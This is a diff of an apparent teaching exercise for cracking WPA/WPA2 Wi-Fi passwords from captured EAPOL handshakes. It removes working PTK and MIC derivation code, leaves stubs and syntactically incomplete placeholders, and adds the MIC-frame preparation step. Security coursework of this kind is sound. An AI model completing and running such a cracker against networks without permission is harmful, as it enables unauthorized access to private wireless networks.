@@ -38,10 +38,9 @@ def extract_nonces(handshake_data: List[bytes]) -> Tuple[bytes, bytes]:
 # Input: handshake_data - a list of bytes objects representing handshake packets.
 # Output: a bytes object representing the modified EAPOL frame.
 def get_mic_frame(handshake_data: List[bytes]) -> bytes:
-    result = b""
-    # Put your implementation here:
-
-    return result
+    mic_frame = handshake_data[1]
+    mic_frame = mic_frame[:81] + b"\x00" * 16 + mic_frame[97:]
+    return mic_frame
 
 
 # Combines MAC addresses and nonces into a single key data structure.
@@ -80,26 +79,20 @@ def calc_pmk(ssid: bytes, password: bytes) -> bytes:
 # Input: pmk and key_data as bytes objects.
 # Output: a bytes object containing the PTK.
 def calc_ptk(pmk: bytes, key_data: bytes) -> bytes:
-    pke = b"Pairwise key expansion"
-    blen = 64
-    i = 0
-    ptk = b""
+    result = b""
+    # Put your implementation here:
 
-    while len(ptk) < blen:
-        hmacsha1 = hmac.new(pmk, pke + b"\x00" + key_data + bytes([i]), hashlib.sha1)
-        ptk += hmacsha1.digest()
-        i += 1
-
-    return ptk[:blen]
+    return result
 
 
 # Calculates the MIC using the PTK and the prepared EAPOL frame.
 # Input: ptk as bytes, mic_frame as bytes.
 # Output: a bytes object containing the MIC.
 def calc_mic(ptk: bytes, mic_frame: bytes) -> bytes:
-    mic = hmac.new(ptk[0:16], mic_frame, "sha1").digest()
-    return mic[:-4]
+    result = b""
+    # Put your implementation here:
 
+    return result
 
 def crack_handshake(ap_ssid: str, handshake: List[scapy.packet], password_list, debug = False) -> None:
     handshake_data = [get_eapol_bytes(packet) for packet in handshake]
@@ -111,7 +104,7 @@ def crack_handshake(ap_ssid: str, handshake: List[scapy.packet], password_list, 
     mic_frame = get_mic_frame(handshake_data)
 
     for password in password_list:
-        pmk = calc_pmk(ap_ssid.encode('ascii'), password.encode('ascii'))
+        pmk = # Your implementation here
         ptk = # Your implementation here
         new_mic = # Your implementation here
 
@@ -128,7 +121,6 @@ def crack_handshake(ap_ssid: str, handshake: List[scapy.packet], password_list, 
             print("[?] Calculated PTK : ", ptk.hex())
             print("[?] Calculated MIC : ", new_mic.hex())
             print("[?] Actual MIC     : ", mic.hex())
-
 
 
 def crack_eapol(ap_ssid: str, pcap_filename: str, password_list, debug = False):
